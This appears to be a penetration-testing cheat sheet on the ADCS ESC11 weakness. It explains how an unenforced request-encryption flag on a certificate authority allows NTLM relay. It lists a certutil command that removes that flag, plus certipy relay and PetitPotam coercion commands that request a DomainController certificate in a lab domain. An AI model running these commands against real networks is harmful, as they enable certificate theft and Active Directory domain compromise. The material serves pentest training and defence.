## Overview
By default, ADCS exposes an RPC endpoint for certificate enrollment called the `MS-ICPR` RPC interface. The RPC protocol allows each interface to define its NTLM signature management policy. In the case of the `MS-ICPR` interface, the setting of the `IF_ENFORCEENCRYPTICERTREQUEST` flag determines whether the signature check is enabled.

By default, this flag is configured to verify the signature. However, if an administrator has modified this setting due to authentication issues in the Active Directory (which may occur if older Windows Server versions like Windows Server 2012 or 2008 are present in the domain), it becomes possible to carry out an NTLM relay attack and request a certificate from an authorized certificate template.

The flag `IF_ENFORCEENCRYPTICERTREQUEST` enforces the encryption of certificate enrollment requests between a client and the `CA`; the client must encrypt any certificate request it sends to the CA. Therefore, if the `CA` does not have the flag `IF_ENFORCEENCRYPTICERTREQUEST` set, unencrypted sessions (think relaying coerced SMB NTLM authentication over HTTP) can be used for certificate enrollment.



---
## Enumeration
### Linux
```sh
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
```
### windows
```powershell
certutil -setreg CA\InterfaceFlags -IF_ENFORCEENCRYPTICERTREQUEST
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\INLANEFREIGHT-DC01-CA\InterfaceFlags:

```
---
## Abuse
#### Linux
```shell
# 1. Start the relay server
sudo certipy relay -target "rpc://172.16.19.5" -ca "lab-WS01-CA" -template DomainController 
# 2. coerce authentication
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19 172.16.19.3

```